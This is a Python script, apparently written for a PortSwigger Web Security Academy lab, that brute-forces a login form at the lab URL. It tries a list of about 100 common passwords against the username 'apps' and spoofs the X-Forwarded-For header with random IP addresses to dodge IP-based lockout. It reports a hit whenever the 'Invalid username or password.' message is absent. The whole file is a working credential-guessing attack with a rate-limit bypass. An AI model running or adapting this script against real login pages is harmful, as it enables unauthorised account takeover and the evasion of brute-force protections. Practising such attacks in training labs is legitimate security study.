#!/usr/bin/env python3
import requests
import string
import time
import random

# Target URL
url = 'https://0a2e007c0315b34681a0d0ff00740090.web-security-academy.net/login'

username = ["apps"]

passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]

realPassword=[]

#this is to change where my ip is coming from, this is in case of brute force ip blocking.
def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

for password in passwords:

    data = {
        'username': username,
        'password': password
            }

    #this changes the origin ip, but only works if the headers are trusted, normally they aren't
    headers = {"X-Forwarded-For": random_ip()}

    # Send POST request with FORM data using the data parameter
    response = requests.post(url, data=data, headers=headers)

    # Print the response
    #print(response.text)

    if 'Invalid username or password.' not in response.text:
        print(f"Password Found!: {password}")
        realPassword.append(password)
    else:
        print(f"Incorrect Password: {password}")

print(f"Password: \n{realPassword}")
